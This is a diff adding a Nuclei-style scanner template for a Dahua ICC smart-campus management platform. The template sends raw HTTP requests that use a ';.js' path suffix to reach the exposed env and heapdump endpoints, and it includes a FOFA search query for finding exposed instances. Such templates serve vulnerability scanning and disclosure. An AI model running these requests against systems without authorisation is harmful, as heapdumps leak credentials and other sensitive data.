@@ -1,0 +1,37 @@
+id: dahua-icc-evo_heapdump-infoleak
+
+info:
+  name: 大华ICC智慧校园综合管理平台env/heapdump敏感信息泄露
+  author: HuanXiong
+  severity: high
+  metadata:
+    fofa-query: body="static/fontshd/font-hd.css"||body="客户端会小于800"
+
+  tags: Information Disclosure
+
+http:
+  - raw:
+      - |+
+        GET /evo-apigw/dsc-mac/env;.js HTTP/2
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
+        Accept: application/json, text/plain, */*
+        Content-Length: 2
+
+      - |+
+        GET /evo-apigw/dsc-mac/heapdump;.js HTTP/2
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
+        Accept: application/json, text/plain, */*
+        Content-Length: 2
+
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - os.name
+      - type: status
+        status:
+          - 200
